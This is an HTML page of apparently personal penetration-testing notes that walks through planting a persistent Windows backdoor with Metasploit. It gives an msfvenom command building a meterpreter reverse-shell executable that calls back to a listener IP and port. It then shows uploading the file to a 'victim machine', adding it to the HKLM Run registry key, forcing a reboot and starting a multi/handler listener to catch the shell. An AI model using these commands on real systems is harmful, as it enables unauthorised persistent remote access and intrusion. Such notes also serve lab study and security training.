<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>backdoor with registry key</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>backdoor with registry key</h1><br/><br />1. create a backdoor with msfvenom:<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali# msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp LHOST=192.168.1.122 LPORT=2345 -f exe -o <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>exploit.exe</pre></div><br />2. upload into the victim machine<br />    <div class="codebox"><pre>meterpreter &gt; <span style="color:#ff9d00;font-weight:700">pwd</span><br />meterpreter &gt; upload <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>exploit.exe .</pre></div><br />    <a href=""><img src="images/867-1.png" alt="images/867-1.png" /></a><br />3. Edit the registry key with the reg command<br />    <code>reg setval -k [registry_key_path] -d [value_of_the key] -v [name_of_the_key]</code><br />    <div class="codebox"><pre>meterpreter &gt; reg setval -k HKLM<span style="color:#333333;font-weight:400">\\</span>software<span style="color:#333333;font-weight:400">\\</span>microsoft<span style="color:#333333;font-weight:400">\\</span>windows<span style="color:#333333;font-weight:400">\\</span>currentversion<span style="color:#333333;font-weight:400">\\</span>run -d <span style="color:#3ad900;font-weight:400">&quot;C:\Users\danie\Desktop\exploit.exe&quot;</span> -v exploit_daniele_<span style="color:#ffdd00;font-weight:400">&lt;</span>3</pre></div> <a href=""><img src="images/867-2.png" alt="images/867-2.png" /></a><br />    <a href=""><img src="images/867-3.png" alt="images/867-3.png" /></a><br />4. Restart the remote Windows machine to make effective the backdoor<br />    <div class="codebox"><pre>msf &gt; sessions -i &lt;Id-session&gt;<br />meterpreter &gt; shell<br />C:\Users\danie\Desktop&gt; shutdown /r /f</pre></div><br />    <a href=""><img src="images/867-4.png" alt="images/867-4.png" /></a><br />5. come back to metasploit and check if there are working listeners <br />    <div class="codebox"><pre>jobs -lshow option</pre></div><br />    if not we have to create a listener on metasploit<br />    <div class="codebox"><pre>use exploit/multi/handler<br />set lhost &lt;lhost&gt;<br />set lport &lt;lport&gt;<br />set payload &lt;same-payload-placed-in-the-victim-machine&gt;<br />run</pre></div><br />6. press ENTER and interact with the backdoor session</div>
</body>
</html>
